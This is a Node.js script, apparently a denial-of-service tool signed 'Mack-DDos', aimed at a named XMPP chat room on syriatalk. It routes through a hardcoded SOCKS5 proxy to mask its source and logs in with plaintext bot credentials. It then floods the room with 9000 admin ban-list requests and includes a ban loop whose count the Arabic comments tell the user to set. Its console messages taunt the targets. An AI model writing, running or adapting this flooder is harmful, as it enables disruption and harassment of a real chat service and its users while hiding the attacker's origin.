const xmpp = require('node-xmpp-client');
const net = require('net');

const jid = 'bot.mot@syrianlove.com/syrianlove.com';
const password = '22156';
const roomJid = 'بنات@conference.syriatalk.info';
const nick = 'امممممم';
const banReason = '"""""';

//خليك برا 🐸✋
const proxy = {
  host: '142.54.237.34',
  port: 4145,
  type: 5 // SOCKS5 proxy
};


const socksSocket = new net.Socket();
socksSocket.connect(proxy.port, proxy.host, function() {

  socksSocket.write(Buffer.from([0x05, 0x01, 0x00]));


  socksSocket.once('data', function(data) {
    if (data[0] === 0x05 && data[1] === 0x00) {
      console.log('SOCKS5 handshake successful fuck u jnon By Mack-DDos');


      const hostname = 'syrianlove.com';
      const port = 5222;
      const hostnameBuffer = Buffer.from(hostname);
      const portBuffer = Buffer.alloc(2);
      portBuffer.writeUInt16BE(port, 0);
      const connectRequest = Buffer.concat([
        Buffer.from([0x05, 0x01, 0x00, 0x03, hostnameBuffer.length]),
        hostnameBuffer,
        portBuffer
      ]);
      socksSocket.write(connectRequest);


      socksSocket.once('data', function(data) {
        if (data[0] === 0x05 && data[1] === 0x00 && data[2] === 0x00) {
          console.log('Connected to XMPP server via SOCKS proxy Hi By macKdoS');


          const client = new xmpp.Client({
            jid: jid,
            password: password,
            socket: socksSocket,
            host: 'syriatalk.org',
            port: 5222
          });


          client.on('online', function() {
            console.log('Connected to XMPP server By mackdos hahaha');


            const presence = new xmpp.Element('presence', {
              to: roomJid + '/' + nick
            });
            client.send(presence);


            setTimeout(function() {
//هون بتحط عدد المفصولين انا مثلا حاتطها 99 السطر التاني تحت
              const banList = new Set();
              for (let i = 1; i <= 0; i++) {
                const jid = 'viper' + i + '@syrianlove.com';
                const banIq = new xmpp.Element('iq', {
                  type: 'set',
                  to: roomJid
                }).c('query', {
                  xmlns: 'http://jabber.org/protocol/muc#admin'
                }).c('item', {
                  affiliation: 'outcast',
                  jid: jid
                }).c('reason').t(banReason);
                client.send(banIq);
                banList.add(jid);
              }
              console.log('Added JIDs to ban list by Mackdos:', Array.from(banList));

//هون عدد طلبات قائمة المفصولين السر التحت مباشر حاتطها 9000
              for (let i = 1; i <= 9000; i++) {
                const banListIq = new xmpp.Element('iq', {
                  type: 'get',
                  to: roomJid
                }).c('query', {
                  xmlns: 'http://jabber.org/protocol/muc#admin'
                }).c('item', {
                  affiliation: 'outcast'
                });
                client.send(banListIq);

                setTimeout(function() {
                  console.log('Received ban list by mackdos:', banList);
                }, 1000 * i);
              }
            }, 5000);
          });


          client.on('error', function(error) {
            console.error('XMPP error:', error);
          });


          client.on('end', function() {
            console.log('XMPP connection closed');
          });
        } else {
          console.error('SOCKS5 connect error:', data);
        }
      });
    } else {
      console.error('SOCKS5 handshake error:', data);
    }
  });
});


socksSocket.on('error', function(error) {
  console.error('SOCKS socket error:', error);
});